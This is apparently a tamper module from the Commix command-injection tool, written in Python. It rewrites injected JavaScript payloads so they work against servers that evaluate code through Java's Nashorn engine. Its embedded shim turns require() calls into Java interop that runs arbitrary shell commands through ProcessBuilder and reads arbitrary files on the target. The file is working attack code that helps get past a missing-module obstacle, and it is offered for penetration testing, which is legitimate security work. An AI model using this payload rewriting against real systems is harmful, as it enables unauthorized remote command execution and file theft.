#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

from src.utils import settings
from src.core.controller import checks

"""
About: Rewrites the grammar's require() calls into a Java-interop shim, and its one ES2019 string
       method into an equivalent Nashorn actually implements, for a sink evaluating JavaScript
       through Java's Nashorn engine rather than Node.
Notes: This tamper script works against target(s) evaluating JavaScript (i.e. option '--eval=javascript').
       Nashorn parses the same syntax the grammar already writes, so the payload itself needs no
       change of its own - only two things it calls are missing. 'require("child_process")' and
       'require("fs")' resolve to nothing, since neither module exists outside Node; Nashorn
       exposes the whole Java classpath as plain globals by default though, with no filter
       configured unless the embedding application added one itself, so a shim standing in for
       the module reaches a real shell through java.lang.ProcessBuilder in execSync's place, and
       a real file through java.nio.file.Files in readFileSync's place. Separately, every answer
       the grammar reads back is trimmed with 'trimEnd()' - added to the language in 2019, well
       after the ECMAScript version Nashorn implements, where the call is simply not defined.
Reference: https://www.exploit-db.com/exploits/33028 (same shape against JRuby's own sandbox: a
           blocked native call reached instead through the host language's interop)
"""

__tamper__ = "nashornexec"
__priority__ = settings.PRIORITY.NORMAL

def dependencies():
  return checks.tamper_dep_command_incompatible(__tamper__) or checks.tamper_dep_grammar_only(__tamper__, "javascript")

if not settings.TAMPER_SCRIPTS[__tamper__]:
  settings.TAMPER_SCRIPTS[__tamper__] = True

# One object literal standing in for whichever module require() is asked for, dispatching to the
# Java class that does the same job in Nashorn - a single expression in require()'s own place, not
# a statement ahead of it, so it drops into the concatenation the grammar already built around it.
_SHIM = (
  '(function(m){'
  'if(m=="child_process")return{execSync:function(c){'
  'var p=new java.lang.ProcessBuilder(["sh","-c",c]).redirectErrorStream(true).start();'
  'var s=new java.util.Scanner(p.getInputStream()).useDelimiter("\\\\A");'
  'var o=s.hasNext()?s.next():"";'
  'p.waitFor();'
  'return o;'
  '}};'
  'if(m=="fs")return{readFileSync:function(p){'
  'return new java.lang.String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(p)));'
  '}};'
  '})('
)

def tamper(payload):
  if settings.EVAL_GRAMMAR.NAME != "javascript":
    return payload
  # Every require() the grammar writes opens on the same bracket regardless of the module named,
  # the way the shim itself only decides which module it is once it is actually called.
  payload = payload.replace('require(', _SHIM)
  # The one ES2019 method the grammar relies on, rewritten to what trimming trailing whitespace
  # looked like before that version - a regex substitution every ECMAScript release has had.
  payload = payload.replace('.trimEnd()', '.replace(/\\s+$/,"")')
  return payload

# eof
